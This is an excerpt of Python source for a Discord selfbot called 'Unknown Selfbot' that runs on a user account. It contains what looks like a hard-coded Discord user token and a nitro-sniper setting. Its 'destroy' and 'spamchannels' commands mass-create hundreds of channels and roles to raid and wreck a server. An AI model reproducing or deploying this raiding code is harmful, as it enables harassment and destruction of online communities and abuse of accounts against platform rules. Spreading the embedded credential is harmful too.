...
token = config.get('"mfa.4S2P8duy6c6U0JLdJbzRAbXgd4p234JLI4Mwz1rzuVuTcbaNFybJBeEZQ_MNdwdxSOt4TTlSUH1Zpb2ToQCZ"')
password = config.get('n')
prefix = config.get('>')

nitro_sniper = config.get('nitro_sniper')

stream_url = "https://www.twitch.tv/wins_fangless"
tts_language = "en"
...
def Init():
    ...
    try:
        ...
        os.system(f'title (Unknown Selfbot) - Version {SELFBOT.__version__}')
...
Exeter = commands.Bot(
    description='Unknown Selfbot', command_prefix=prefix, self_bot=True)
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/Link/of-the-webhook',
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_image(
            url=
            "https://tenor.com/view/bun-hacks-inferno-ring-of-fire-gif-14706659"
        )
        embed.add_field(
            name=":star:  `HELP GENERAL`",
            value="Shows all general commands",
            inline=False)
        embed.add_field(
            name=":star:  `HELP ACCOUNT`",
        ...
        embed.add_field(
            ...
            inline=False)
        embed.add_field(
            name=":star:  `HELP MUSIC`",
            value="Shows all music commands",
            inline=False)
        embed.add_field(
            name=":star:  `HELP IMAGE`",
        ...
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/824542508397887512/825995284453654538/Untitled164_1.jpg"
        )
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Unknown Ran You")
    for _i in range(250):
        await ctx.guild.create_role(name="Big Daddy Unknown", color=RandomColor())
...
async def spamchannels(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Unknown Runs You")
        except:
            return
